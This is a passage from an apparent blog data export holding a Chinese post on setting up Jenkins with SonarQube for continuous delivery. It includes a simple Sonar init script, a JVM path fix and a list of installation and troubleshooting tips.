Plugins&#x4E0B;&#x5B89;&#x88C5;&#x6C49;&#x5316;&#x5305;&#xFF0C;&#x5E76;&#x91CD;&#x65B0;&#x542F;&#x52A8;Sonar&#x3002;<br><strong>&#x6CE8;&#x610F;&#xFF1A;</strong>&#x5F53;&#x67D0;&#x4E9B;&#x63D2;&#x4EF6;&#x603B;&#x662F;&#x4E0B;&#x8F7D;&#x5931;&#x8D25;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x641C;&#x7D22;&#x63D2;&#x4EF6;&#x540D;&#x624B;&#x52A8;&#x4E0B;&#x8F7D;&#xFF0C;&#x5E76;&#x5728;&#x3010;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x2013;&#x7BA1;&#x7406;&#x63D2;&#x4EF6;&#x2013;&#x9AD8;&#x7EA7;&#x2013;&#x6D4F;&#x89C8;-&#x4E0A;&#x4F20;&#x63D2;&#x4EF6;&#x3011;&#x4E2D;&#x4E0A;&#x4F20;&#x63D2;&#x4EF6;&#x5373;&#x53EF;&#x3002;</p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;Jenkins&#x96C6;&#x6210;Sonar&#x540E;&#xFF0C;Sonar&#x65E0;&#x6CD5;&#x626B;&#x63CF;Java&#x8BED;&#x8A00;&#x4EE3;&#x7801;</strong><br><strong>&#x65B9;&#x6848;&#xFF1A;</strong>&#x5728;Sonar&#x7684;Settings/SYSTEM/Update Center/Available&#x76EE;&#x5F55;&#x4E0B;&#x4E0B;&#x8F7D;Java&#x8BED;&#x8A00;&#x5305;&#xFF0C;&#x5E76;&#x91CD;&#x65B0;&#x542F;&#x52A8;Jenkins&#x548C;Sonar&#x3002;Jenkins&#x4F1A;&#x6839;&#x636E;&#x914D;&#x7F6E;&#x7684;&#x626B;&#x63CF;&#x8DEF;&#x5F84;&#xFF0C;&#x5B9A;&#x65F6;&#x626B;&#x63CF;&#x76F8;&#x5173;&#x4EE3;&#x7801;&#xFF0C;&#x5E76;&#x5728;Sonar&#x4E2D;&#x53EF;&#x89C6;&#x5316;&#x3002;<br><strong>&#x6CE8;&#x610F;&#xFF1A;</strong>SonarQube&#x96C6;&#x6210;Java&#x63D2;&#x4EF6;&#x5B98;&#x65B9;&#x5730;&#x5740;&#xFF1A;<a href=\"http://docs.sonarqube.org/display/PLUG/Java+Plugin\" target=\"_blank\" rel=\"external\">http://docs.sonarqube.org/display/PLUG/Java+Plugin</a></p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;&#x4E0B;&#x8F7D;&#x67D0;&#x8BED;&#x8A00;&#x5305;&#x540E;&#xFF0C;Sonar&#x91CD;&#x542F;&#x4ECD;&#x7136;&#x65E0;&#x6CD5;&#x626B;&#x63CF;&#x76F8;&#x5173;&#x4EE3;&#x7801;</strong><br><strong>&#x539F;&#x56E0;&#xFF1A;</strong>&#x5982;&#x4E0B;&#x8F7D;&#x201D;C/C++/Objective-c&#x201D;&#x8FD9;&#x4E2A;&#x63D2;&#x4EF6;&#x540E;&#xFF0C;&#x91CD;&#x65B0;&#x542F;&#x52A8;&#x626B;&#x63CF;C&#x4EE3;&#x7801;&#x603B;&#x662F;&#x62A5;&#x9519;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Caused by: org.sonar.api.utils.SonarException: No license <span class=\"keyword\">for</span> cpp</span><br></pre></td></tr></table></figure></p>\n<p>&#x539F;&#x4EE5;&#x4E3A;&#x662F;&#x9700;&#x8981;&#x5B89;&#x88C5;cpp&#x63D2;&#x4EF6;&#xFF0C;&#x540E;&#x6765;&#x624D;&#x53D1;&#x73B0;&#x91CD;&#x70B9;&#x662F;No license&#xFF0C;&#x610F;&#x601D;&#x5C31;&#x662F;&#x9700;&#x8981;&#x4ED8;&#x8D39;&#x8D2D;&#x4E70;&#x8BB8;&#x53EF;&#x8BC1;&#x3002;<br>&#x7F51;&#x4E0A;&#x641C;&#x7D22;&#x514D;&#x8D39;&#x8BB8;&#x53EF;&#x8BC1;&#x65E0;&#x679C;&#xFF0C;&#x7136;&#x540E;&#x70B9;&#x51FB;&#x201D;Get trial key&#x201D;, &#x7ED3;&#x679C;&#x7ACB;&#x9A6C;&#x6536;&#x5230;&#x5B98;&#x65B9;&#x90AE;&#x4EF6;&#x56DE;&#x590D;&#x88AB;&#x62D2;&#xFF0C;&#x7EC8;&#x653E;&#x5F03;&#x3002;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/3.png\" alt=\"&#x56FE;&#x7247;3\"></p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;Jenkins&#x96C6;&#x6210;Sonar&#x540E;&#xFF0C;Jenkins&#x81EA;&#x52A8;&#x5316;&#x811A;&#x672C;&#x6267;&#x884C;&#x5931;&#x8D25;&#xFF0C;&#x5E76;&#x62A5;&#x5982;&#x4E0B;&#x9519;&#x8BEF;</strong><br><strong>&#x65B9;&#x6848;&#xFF1A;</strong>&#x66F4;&#x6362;&#x63D2;&#x4EF6;&#x7248;&#x672C;&#x5373;&#x53EF;&#xFF0C;&#x4E0B;&#x6B21;&#x5B89;&#x88C5;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/4.png\" alt=\"&#x56FE;&#x7247;4\"></p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;Jenkins&#x8D26;&#x6237;&#x6743;&#x9650;&#x5982;&#x4F55;&#x5206;&#x914D;</strong><br><strong>&#x65B9;&#x6848;&#xFF1A;</strong> &#x76F8;&#x5173;&#x94FE;&#x63A5;&#xFF1A;<a href=\"http://www.360doc.com/content/13/0802/14/7811581_304255550.shtml\" target=\"_blank\" rel=\"external\">http://www.360doc.com/content/13/0802/14/7811581_304255550.shtml</a><br><strong>&#x6CE8;&#x610F;&#xFF1A;</strong> &#x5982;&#x679C;&#x7528;admin&#x8D26;&#x6237;&#x767B;&#x5F55;&#xFF0C;&#x5728;&#x5206;&#x914D;&#x6743;&#x9650;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C06;admin&#x6743;&#x9650;&#x5168;&#x90E8;&#x7F6E;&#x7A7A;&#xFF0C;&#x4E00;&#x65E6;&#x9000;&#x51FA;&#xFF0C;&#x5C06;&#x65E0;&#x6CD5;&#x4F7F;&#x7528; 0.0&#xFF01;&#x6211;&#x5F53;&#x521D;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x662F;&#x4FEE;&#x6539;&#x8FDC;&#x7A0B;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x800C;&#x5982;&#x679C;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E00;&#x65E6;&#x6539;&#x4E71;&#xFF0C;&#x5C31;&#x53EA;&#x80FD;&#x91CD;&#x88C5;&#x4E86;&#x3002;</p>\n<h3 id=\"&#x8FD0;&#x884C;&#x7ED3;&#x679C;\"><a href=\"#&#x8FD0;&#x884C;&#x7ED3;&#x679C;\" class=\"headerlink\" title=\"&#x8FD0;&#x884C;&#x7ED3;&#x679C;\"></a>&#x8FD0;&#x884C;&#x7ED3;&#x679C;</h3><p><strong>Sonar&#x6210;&#x529F;&#x8FD0;&#x884C;&#x5982;&#x56FE;&#x4E94;&#x56FE;&#x516D;&#x6240;&#x793A;&#xFF0C;&#x5176;&#x4E2D;&#x4EE3;&#x7801;&#x68C0;&#x6D4B;&#x89C4;&#x5219;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x4E5F;&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#xFF0C;&#x5BF9;&#x4E8E;&#x56FE;&#x516D;&#x663E;&#x793A;&#x51FA;&#x7684;&#x5177;&#x4F53;&#x9519;&#x8BEF;&#xFF0C;Sonar&#x4E5F;&#x53EF;&#x5728;&#x9875;&#x9762;&#x76F4;&#x63A5;&#x5206;&#x914D;&#x7ED9;&#x67D0;&#x4E2A;&#x7EC4;&#x5458;&#x4FEE;&#x6539;</strong></p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/5.png\" alt=\"&#x56FE;&#x7247;5\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/6.png\" alt=\"&#x56FE;&#x7247;6\"></p>\n<p><br></p>\n","excerpt":"<h3 id=\"&#x524D;&#x8A00;\"><a href=\"#&#x524D;&#x8A00;\" class=\"headerlink\" title=\"&#x524D;&#x8A00;\"></a>&#x524D;&#x8A00;</h3><p>Kurt Bittner&#x66FE;&#x8BF4;&#x8FC7;&#xFF0C;&#x5982;&#x679C;&#x654F;&#x6377;&#x4EC5;&#x4EC5;&#x53EA;&#x662F;&#x5F00;&#x59CB;&#xFF0C;&#x90A3;&#x6301;&#x7EED;&#x4EA4;&#x4ED8;&#x5C31;&#x662F;&#x5934;&#x6761;!<br><em>&#x201C;If Agile Was the Opening Act, Continuous Delivery is the Headliner!&#x201D;&#x2014;&#x2014;Kurt Bittner</em></p>\n<p>&#x4E94;&#x6708;&#x4E0A;&#x65EC;&#x6211;&#x7684;&#x4E00;&#x4E2A;&#x4E3B;&#x8981;&#x5DE5;&#x4F5C;&#x5C31;&#x662F;&#x642D;&#x5EFA;&#x6301;&#x7EED;&#x4EA4;&#x4ED8;&#x5E73;&#x53F0;&#x3002;<br>&#x6253;&#x7B97;&#x4EE5;Jenkins&#x4E3A;&#x6838;&#x5FC3;&#xFF0C;&#x6BCF;&#x5929;&#x5B9A;&#x65F6;&#x4ECE;&#x4EE3;&#x7801;&#x5E93;&#x4E2D;&#x68C0;&#x51FA;&#x6700;&#x65B0;&#x7684;&#x4EE3;&#x7801;&#x8FDB;&#x884C;&#x7F16;&#x8BD1;&#x3001;&#x6784;&#x5EFA;&#x3002;&#x6784;&#x5EFA;&#x7ED3;&#x679C;&#x901A;&#x8FC7;&#x81EA;&#x52A8;&#x53D1;&#x9001;&#x7684;&#x90AE;&#x4EF6;&#x901A;&#x77E5;&#x5230;&#x9879;&#x76EE;&#x7EC4;&#xFF0C;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x6BCF;&#x5929;&#x53EA;&#x9700;&#x5173;&#x5FC3;&#x6700;&#x65B0;&#x7684;&#x96C6;&#x6210;&#x7ED3;&#x679C;&#x662F;&#x5426;&#x6B63;&#x786E;&#x5373;&#x53EF;&#x3002;</p>\n<p>&#x518D;&#x642D;&#x5EFA;SonarQube&#x4EE3;&#x7801;&#x8D28;&#x91CF;&#x68C0;&#x6D4B;&#x5DE5;&#x5177;&#xFF0C;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5B9A;&#x65F6;&#x626B;&#x63CF;&#x4EE3;&#x7801;&#x5E93;&#x6700;&#x65B0;&#x4EE3;&#x7801;&#xFF0C;&#x68C0;&#x6D4B;&#x51FA;&#x4EE3;&#x7801;&#x4E2D;&#x7684;&#x5B58;&#x5728;&#x7684;&#x963B;&#x65AD;&#x9519;&#x8BEF;&#x3001;&#x4E25;&#x91CD;&#x9519;&#x8BEF;&#x3001;&#x4E3B;&#x8981;&#x9519;&#x8BEF;&#x3001;&#x6B21;&#x8981;&#x9519;&#x8BEF;&#x548C;&#x76F8;&#x5173;&#x63D0;&#x793A;&#x4FE1;&#x606F;&#x3002;&#x901A;&#x8FC7;SonarQube&#x80FD;&#x6709;&#x6548;&#x7B80;&#x6D01;&#x7EDF;&#x4E00;&#x4EE3;&#x7801;&#x98CE;&#x683C;&#xFF0C;&#x5229;&#x4E8E;&#x5927;&#x5BB6;&#x66F4;&#x597D;&#x7684;&#x76F8;&#x4E92;&#x7406;&#x89E3;&#x548C;&#x540E;&#x671F;&#x6392;&#x67E5;&#x3002;</p>\n<p>&#x4EE5;&#x4E0B;&#x662F;&#x642D;&#x5EFA;&#x8FC7;&#x7A0B;&#x4E2D;&#x7528;&#x5230;&#x7684;&#x76F8;&#x5173;&#x7F51;&#x7AD9;&#x53CA;&#x78B0;&#x5230;&#x7684;&#x5751;&#x3002;</p>\n<hr>\n<h3 id=\"&#x76F8;&#x5173;&#x7F51;&#x7AD9;\"><a href=\"#&#x76F8;&#x5173;&#x7F51;&#x7AD9;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x7F51;&#x7AD9;\"></a>&#x76F8;&#x5173;&#x7F51;&#x7AD9;</h3><p>Sonar&#x5B98;&#x65B9;&#x7F51;&#x7AD9;&#xFF1A;<a href=\"http://www.sonarqube.org/\">http://www.sonarqube.org/</a><br>Jenkins&#x5B98;&#x65B9;&#x4F7F;&#x7528;&#x6559;&#x7A0B;&#xFF1A;<a href=\"https://wiki.jenkins-ci.org/display/JENKINS/Use+Jenkins\">https://wiki.jenkins-ci.org/display/JENKINS/Use+Jenkins</a><br>Jenkins&#x5B89;&#x88C5;&#x94FE;&#x63A5;&#xFF1A;<a href=\"http://www.cnblogs.com/zhangqingsh/archive/2013/03/19/2968998.html\">http://www.cnblogs.com/zhangqingsh/archive/2013/03/19/2968998.html</a><br>Sonar&#x5B89;&#x88C5;&#x94FE;&#x63A5;&#xFF1A;<a href=\"http://flyingdutchman.iteye.com/blog/1905906\">http://flyingdutchman.iteye.com/blog/1905906</a><br>Sonar&#x7B80;&#x4ECB;&#x53CA;&#x5B89;&#x88C5;&#x5730;&#x5740;&#xFF1A;<a href=\"http://www.ibm.com/developerworks/cn/opensource/os-sonarqube/\">http://www.ibm.com/developerworks/cn/opensource/os-sonarqube/</a><br>Jenkins&#x4F7F;&#x7528;&#x96C6;&#x9526;&#xFF1A;<a href=\"http://my.oschina.net/u/260244/blog/318755?fromerr=ZvUu6dmF\">http://my.oschina.net/u/260244/blog/318755?fromerr=ZvUu6dmF</a><br>Jenkins&#x548C;Sonar&#x6574;&#x5408;&#x5730;&#x5740;1&#xFF1A;<a href=\"https://lasithapetthawadu.wordpress.com/2014/05/03/configure-jenkins-with-sonarqube-for-static-code-analysis-and-integration/\">https://lasithapetthawadu.wordpress.com/2014/05/03/configure-jenkins-with-sonarqube-for-static-code-analysis-and-integration/</a><br>Jenkins&#x548C;Sonar&#x6574;&#x5408;&#x5730;&#x5740;2&#xFF1A;<a href=\"http://www.cnblogs.com/zhuhongbao/p/4197974.html\">http://www.cnblogs.com/zhuhongbao/p/4197974.html</a><br>&#x642D;&#x5EFA;&#x8FC7;&#x7A0B;&#x4E2D;&#x6D89;&#x53CA;&#x5230;&#x7684; JDK&#x3001;Tomcat&#x3001;Mysql&#x3001;Redis&#x3001;Maven&#x7B49;&#x7CFB;&#x5217;&#x5B89;&#x88C5;&#x94FE;&#x63A5;&#x7701;&#x7565;  0.0&#xFF01;</p>","more":"<hr>\n<h3 id=\"sonar&#x6DFB;&#x52A0;service&#x670D;&#x52A1;\"><a href=\"#sonar&#x6DFB;&#x52A0;service&#x670D;&#x52A1;\" class=\"headerlink\" title=\"sonar&#x6DFB;&#x52A0;service&#x670D;&#x52A1;\"></a>sonar&#x6DFB;&#x52A0;service&#x670D;&#x52A1;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &#x7F16;&#x5199;&#x7B80;&#x5355;&#x7684;sonar&#x542F;&#x52A8;&#x811A;&#x672C;</span></span><br><span class=\"line\">vim /etc/init.d/sonar</span><br><span class=\"line\"></span><br><span class=\"line\">[sonar]</span><br><span class=\"line\"><span class=\"meta\">#!/bin/sh  </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">start</span></span>()  </span><br><span class=\"line\">{  </span><br><span class=\"line\">        /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh start</span><br><span class=\"line\">}  </span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">stop</span></span>()  </span><br><span class=\"line\">{  </span><br><span class=\"line\">        /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh stop</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">status</span></span>()  </span><br><span class=\"line\">{       </span><br><span class=\"line\">        /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh status</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">restart</span></span>()  </span><br><span class=\"line\">{  </span><br><span class=\"line\">        /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh restart</span><br><span class=\"line\">} </span><br><span class=\"line\">SONAR=<span class=\"string\">&quot;/data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh&quot;</span></span><br><span class=\"line\">[ <span class=\"_\">-f</span> <span class=\"variable\">$SONAR</span> ] || <span class=\"built_in\">exit</span> 1  </span><br><span class=\"line\"><span class=\"comment\"># See how we were called.  </span></span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&quot;<span class=\"variable\">$1</span>&quot;</span> <span class=\"keyword\">in</span>  </span><br><span class=\"line\">        start)  </span><br><span class=\"line\">                start  </span><br><span class=\"line\">                ;;  </span><br><span class=\"line\">        stop)  </span><br><span class=\"line\">                stop  </span><br><span class=\"line\">                ;;  </span><br><span class=\"line\">        restart)  </span><br><span class=\"line\">                restart</span><br><span class=\"line\">                ;;  </span><br><span class=\"line\">        status)  </span><br><span class=\"line\">                status </span><br><span class=\"line\">                ;;  </span><br><span class=\"line\">                <span class=\"comment\"># stop    sleep 3   start  ;;  </span></span><br><span class=\"line\">        *)  </span><br><span class=\"line\">                <span class=\"built_in\">echo</span> $<span class=\"string\">&quot;Usage: <span class=\"variable\">$0</span> {start|stop|status|restart}&quot;</span>  </span><br><span class=\"line\">                <span class=\"built_in\">exit</span> 1  </span><br><span class=\"line\"><span class=\"keyword\">esac</span>  </span><br><span class=\"line\"><span class=\"built_in\">exit</span> 0 </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># sonar&#x670D;&#x52A1;&#x9A8C;&#x8BC1;</span></span><br><span class=\"line\">service sonar status</span><br><span class=\"line\">service sonar start</span><br><span class=\"line\">service sonar restart</span><br><span class=\"line\">service sonar stop</span><br></pre></td></tr></table></figure>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;</strong><font style=\"color:red\">&#x9A8C;&#x8BC1;service&#x670D;&#x52A1;&#x65F6;&#xFF0C;&#x53D1;&#x73B0;&#x56DB;&#x4E2A;&#x547D;&#x4EE4;&#x552F;&#x72EC; service sonar start &#x547D;&#x4EE4;&#x5931;&#x8D25;&#xFF0C;&#x4F46;&#x662F;&#x624B;&#x52A8;&#x8F93;&#x5165;&#x4E0B;&#x9762;&#x547D;&#x4EE4;&#x5374;&#x53EF;&#x4EE5;&#x542F;&#x52A8;&#x6210;&#x529F;&#x3010;&#x6DFB;&#x52A0;sonar&#x81EA;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x65F6;&#x4E5F;&#x51FA;&#x73B0;&#x540C;&#x6837;&#x95EE;&#x9898;&#x3011;&#x3002;</font><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh start</span><br></pre></td></tr></table></figure></p>\n<p>&#x6211;&#x4EEC;&#x67E5;&#x770B;&#x76F8;&#x5173;&#x65E5;&#x5FD7;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#tail -f /data/sonar/sonarqube-5.6.1/logs/sonar.log</span></span><br><span class=\"line\">--&gt; Wrapper Started as Daemon</span><br><span class=\"line\">Launching a JVM...</span><br><span class=\"line\">Unable to start JVM: No such file or directory (2)</span><br><span class=\"line\">JVM exited <span class=\"keyword\">while</span> loading the application.</span><br><span class=\"line\">JVM Restarts disabled.  Shutting down.</span><br><span class=\"line\">&lt;-- Wrapper Stopped</span><br></pre></td></tr></table></figure></p>\n<p>log&#x63D0;&#x793A;&#x4E0D;&#x80FD;&#x52A0;&#x8F7D;JVM&#xFF0C;&#x63A5;&#x7740;&#x67E5;&#x770B;sonar&#x7684;wrapper.conf&#x6587;&#x4EF6;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /data/sonar/sonarqube-5.6.1/conf/wrapper.conf</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Path to JVM executable. By default it must be available in PATH.</span></span><br><span class=\"line\"><span class=\"comment\"># Can be an absolute path, for example:</span></span><br><span class=\"line\"><span class=\"comment\">#wrapper.java.command=/path/to/my/jdk/bin/java</span></span><br><span class=\"line\">wrapper.java.command=/java</span><br></pre></td></tr></table></figure></p>\n<p>wrapper.conf&#x6587;&#x4EF6;&#x63D0;&#x793A;wrapper.java.command&#x9700;&#x8981;&#x914D;&#x7F6E;java&#x8DEF;&#x5F84;&#xFF0C;&#x9ED8;&#x8BA4;&#x8DEF;&#x5F84;&#x663E;&#x7136;&#x6709;&#x8BEF;&#xFF0C;&#x4FEE;&#x6539;&#x540E;&#xFF0C;&#x518D;&#x6B21;&#x8FD0;&#x884C;&#x3010;service sonar start&#x3011;&#xFF0C;&#x64CD;&#x4F5C;&#x6210;&#x529F;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wrapper.java.command=/usr/java/jdk1.8.0_31/bin/java</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h3 id=\"&#x7CFB;&#x5217;&#x95EE;&#x9898;\"><a href=\"#&#x7CFB;&#x5217;&#x95EE;&#x9898;\" class=\"headerlink\" title=\"&#x7CFB;&#x5217;&#x95EE;&#x9898;\"></a>&#x7CFB;&#x5217;&#x95EE;&#x9898;</h3><p><strong>&#x95EE;&#x9898;&#xFF1A;&#x901A;&#x8FC7;&#x547D;&#x4EE4;&#x76F4;&#x63A5;&#x5B89;&#x88C5;Jenkins&#xFF0C;&#x8FDE;&#x63A5;&#x88AB;&#x62D2;&#x7EDD;&#x65F6;</strong><br><strong>&#x65B9;&#x6848;&#xFF1A;</strong>&#x624B;&#x52A8;&#x4E0B;&#x8F7D;&#x5305;&#xFF0C;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;<a href=\"http://mirrors.jenkins-ci.org/war/\">http://mirrors.jenkins-ci.org/war/</a></p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;Jenkins&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x540E;&#x542F;&#x52A8;&#x62A5;&#x9519;</strong></p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/1.png\" alt=\"&#x56FE;&#x7247;1\"><br><strong>&#x65B9;&#x6848;&#xFF1A;</strong>&#x901A;&#x8FC7;&#x201D;vi /etc/init.d/jenkins&#x201D;&#xFF0C;&#x628A;JDK&#x7684;java&#x8DEF;&#x5F84;&#x52A0;&#x4E0A;&#x5373;&#x53EF;<br><strong>&#x6CE8;&#x610F;&#xFF1A;</strong>Jenkins&#x542F;&#x52A8;&#x540E;&#x81EA;&#x52A8;&#x90E8;&#x7F72;Tomcat&#xFF0C;Tomcat&#x9700;&#x5148;&#x542F;&#x52A8;<br><!--more--></p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;Sonar&#x65E0;&#x6CD5;&#x542F;&#x52A8;&#xFF0C;Failed to start SonarQube.</strong><br><strong>&#x65B9;&#x6848;&#xFF1A;</strong>&#x5207;&#x6362;&#x6210;root&#x7528;&#x6237;&#x542F;&#x52A8;&#x8BD5;&#x8BD5;&#xFF0C;&#x53EF;&#x80FD;&#x662F;&#x6CA1;&#x6709;&#x6743;&#x9650;&#x3002;</p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;Sonar&#x4E2D;&#x6587;&#x4E71;&#x7801;&#x95EE;&#x9898;</strong><br><strong>&#x65B9;&#x6848;&#xFF1A;</strong>sonar-run&#x914D;&#x7F6E;&#x6709;&#x95EE;&#x9898;&#xFF0C;&#x91CC;&#x9762;&#x7684;jdbc&#x914D;&#x7F6E;&#x662F;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/2.png\" alt=\"&#x56FE;&#x7247;2\"></p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;Sonar&#x67D0;&#x4E2A;&#x7248;&#x672C;&#x5B89;&#x88C5;&#x6210;&#x529F;&#x540E;&#xFF0C;&#x542F;&#x52A8;&#x5374;&#x603B;&#x53EA;&#x663E;&#x793A;&#x4E00;&#x4E2A;&#x9875;&#x9762;&#xFF0C;&#x5E76;&#x63D0;&#x793A;Sonar&#x6B63;&#x5728;&#x7EF4;&#x62A4;&#x4E2D;</strong><br><strong>&#x65B9;&#x6848;&#xFF1A;</strong>&#x65E0;&#x9700;&#x66F4;&#x6362;&#x7248;&#x672C;&#xFF0C;&#x4ED4;&#x7EC6;&#x67E5;&#x770B;&#x53D1;&#x73B0;&#x8BE5;&#x63D0;&#x793A;&#x9875;&#x9762;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x70B9;&#x51FB;&#x8FDB;&#x884C;&#x76F8;&#x5173;&#x63D2;&#x4EF6;&#x7684;&#x81EA;&#x52A8;&#x5347;&#x7EA7;&#xFF0C;&#x91CD;&#x542F;&#x540E;&#x9996;&#x9875;&#x5373;&#x53EF;&#x8BBF;&#x95EE;&#x3002;</p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;Sonar&#x6210;&#x529F;&#x542F;&#x52A8;&#x540E;&#xFF0C;&#x5374;&#x603B;&#x662F;&#x9A6C;&#x4E0A;&#x81EA;&#x52A8;&#x5173;&#x95ED;&#x670D;&#x52A1;</strong><br><strong>&#x65B9;&#x6848;&#xFF1A;</strong>&#x5F88;&#x53EF;&#x80FD;&#x662F;&#x6CA1;&#x6709;&#x542F;&#x52A8;mysql&#x670D;&#x52A1;&#xFF0C;&#x542F;&#x52A8;&#x5373;&#x53EF;&#x3002;</p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;Sonar&#x6210;&#x529F;&#x8FD0;&#x884C;&#x540E;&#xFF0C;&#x5982;&#x4F55;&#x663E;&#x793A;&#x4E2D;&#x6587;?</strong><br><strong>&#x65B9;&#x6848;&#xFF1A;</strong>&#x5728;Settings/SYSTEM/Update Center/Available 